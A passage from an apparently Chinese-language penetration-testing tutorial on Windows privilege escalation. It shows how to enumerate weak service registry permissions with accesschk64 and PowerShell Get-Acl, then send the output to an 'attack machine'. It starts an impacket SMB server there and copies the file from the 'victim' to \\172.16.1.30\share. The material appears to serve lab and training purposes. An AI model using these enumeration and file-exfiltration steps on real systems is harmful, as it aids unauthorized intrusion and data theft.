hklm\System\CurrentControlSet\services -accepteula</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accesschk64.exe &quot;NT AUTHORITY\INTERACTIVE&quot; -kqswvu hklm\System\CurrentControlSet\services -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>为了更好的理解 accesschk 工具参数的用法，可以查看此<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank" rel="noopener noreferrer">手册</a>。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="12枚举弱权限注册表项powershell--linux-fu"><strong><div id="id1.2">1.2、枚举弱权限注册表项：PowerShell + Linux-Fu</div></strong><a href="#12枚举弱权限注册表项powershell--linux-fu" class="hash-link" aria-label="12枚举弱权限注册表项powershell--linux-fu的直接链接" title="12枚举弱权限注册表项powershell--linux-fu的直接链接">​</a></h4>
<p>第二种查找服务弱权限注册表项的方法是使用 PowerShell 的 cmdlet，可使用以下命令：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于输出内容较多，因此，可以将输出重定向到文件，然后发送回我们的攻击机慢慢查看。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921301-1432032333-d1e66e8bfd09c2b5a108e7746e13b57a.png" width="469" height="216" class="img_ev3q"></p>
<p>将此文件发送回攻击机的最方便的方法是在攻击机使用以下命令启动一个 SMB 服务：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">impacket-smbserver share $(pwd) -smb2support</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后回到受害者机器，使用以下命令将文件发送到攻击者机器：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">copy C:\temp\service_keys.txt \\172.16.1.30\share</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="473" height="79" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922852-929955386-7f20d9660b6ceadd4ca5605e93e869da.png" width="1024" height="357" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921978-1405774515-2d77c04695064eff08d0a96e9bcf8042.png" width="504" height="82" class="img_ev3q"></p>
<p>查看两侧文件的字节大小是否一样，以确保文件的传输是正常的。同时，由于 Windows 和 Linux 关于文本文件格式不同的问题，我们需要在攻击机通过 dos2unix 命令将其格式进行转换，然后才能使用 grep 命令去提取我们感兴趣的信息。</p>
